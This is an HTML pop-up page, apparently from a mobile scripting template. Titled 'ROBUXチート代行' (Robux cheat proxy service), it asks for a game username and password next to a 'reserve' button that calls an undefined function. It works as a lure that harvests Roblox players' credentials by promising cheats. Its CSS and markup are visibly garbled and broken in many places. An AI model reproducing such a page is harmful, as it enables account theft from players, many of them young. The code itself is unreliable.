<!DOCTYPE html>
<html>
<head>
<title>H5AlertView</title>
 <script>
setButtonImage();
</script>
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
* {
    /*默认文字颜色*/
    color: #EE00FF;
    font-size: 14px;
    font-family: Arial, sans-serif;
}
html {
    zoom: 0.6
}
body{
    widht: 130%;
    background-color: transparent;
}

#H5AlertView {
    text-align:center;
    /**
    border: 1px dashed gray; background: #000;/**/
}

#title-img{
    position: relative;
    z-index:1;
}

#title-text{
    padding-top:40px;
    font-size:30px;
    color: #;

}

#content-view {
    z-index: 0;
    background-image: url("");
    position:
    top: 0px;
    border: 7px solid #;
    border-radius:0px;
    padding: 10px;
}

button {
    width: 150x;
    height: 40px;
    color: #fff;
    background-color: #ffffff;
    display: inline-block;
    cursor: pointer;
    text-align: center;
    text-decoration: none;
    outline: wheat;
    color: black;
    border: none;
    border-radius: 100px;
    padding: 0 9px;
    margin: 1px 9px;
    font-size:30px;
}
input {
    background-color: #ffffff;
    margin: px px;

input f2
    background-color: #ffffff;
    margin: px px;
    
button:active {
    background-color: #ffffff;
    transform: translateY(0px);
}
    
/* 滚动条整体部分 */
.scrollbar {
    overflow-x: hidden;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
}
.scrollbar::-webkit-scrollbar {
    width: 5px; /* 纵向滚动条宽度 */
    height: 5px;/* 横向滚动条高度 */
    background-color: #F5F5F5; /* 滚动条整体背景，一般被覆盖着 */
}
/* 滚动条的轨道（里面装有Thumb） */
.scrollbar::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); /* 滚动条轨道阴影 */
    /*border-radius: 10px; /* 滚动条轨道圆角 */
    background-color: #F5F5F5; /* 滚动条轨道背景 */
}
/* 滚动条里面的滑块 */
.scrollbar::-webkit-scrollbar-thumb {
    border-radius: 15px; /* 滚动条滑块圆角 */
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); /* 滚动条滑块阴影 */
    background-color: #B8B8B8; /* 滚动条滑块颜色 */
}

</style>
<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script>
if(typeof $ == 'undefined') alert("网络异常无法访问百度CDN!");

//页面显示完毕事件
$(document).ready(function(){
    /*禁止文本选择和拖动*/
    document.body.onselectstart = document.body.ondrag =function(){
        return false;
    }
    //文本框等输入完毕后页面自动滚动到顶部
    $("input").blur(function(){
        window.scroll(0,0);
    });
    
    //激活webkit的button:active
    document.body.addEventListener('touchstart', function () {});
    
    //调整悬浮窗位置和尺寸并全屏居中显示
    var w=210; var h=300;
    if(window.screen.availWidth < window.screen.availHeight) {
        //竖屏
        var x=(window.screen.width - w)/2;
        var y=(window.screen.height - h)/2;
        setWindowRect(x, y, w, h);
    } else {
        //横屏
        var x=(window.screen.height - w)/2;
        var y=(window.screen.width - h)/2;
        setWindowRect(x, y, w, h);
    }
});
                  
</script>
</head>
<body>
<div id="H5AlertView">
<div id="title-img">
</div>
<script>

</script>
<div id="content-view">
<div id="title-text">ROBUXチート代行</div>
<div class="scrollbar" style="max-height:400px">
             
               <button onclick="f2()">予約</button>
 <input type=text" name="rakuto0122@yahoo.co.jp" placeholder="ユーザーネーム" />
 
 <input type=text" name="rakuto0122@yahoo.co.jp" placeholder="パスワード" />
 
</div>
</div>
</div>
</body>

